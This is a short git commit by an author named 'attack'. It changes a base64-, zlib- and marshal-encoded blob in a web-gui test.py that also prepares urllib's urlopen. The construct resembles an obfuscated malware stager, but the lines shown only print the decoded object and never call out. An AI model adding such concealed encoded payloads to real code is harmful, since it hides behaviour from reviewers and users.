f3a577b3c5cad2d379c1fbe880517c55308d3a5d
attack <attack@vmattack.asia-southeast1-c.c.encoded-horizon-460908-s4.internal>
2026-03-31 03:24:32 +0000

    update

--- web-gui/test.py
+++ web-gui/test.py
@@ -3,4 +3,4 @@ import sys,zlib,base64,marshal,json,urllib
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
-print(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3tDTSMzSz0DM21zMysTI0NrbQ1y8uSUxPLSrWzzSN0CuoVNfUK0pNTNHQBAA9xBH5'))))
+print(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3NDbTMzQ00DMz0jMyMrEyNDa20NcvLklMTy0q1i8z9tArqFTX1CtKTUzR0AQASkkSFg=='))))
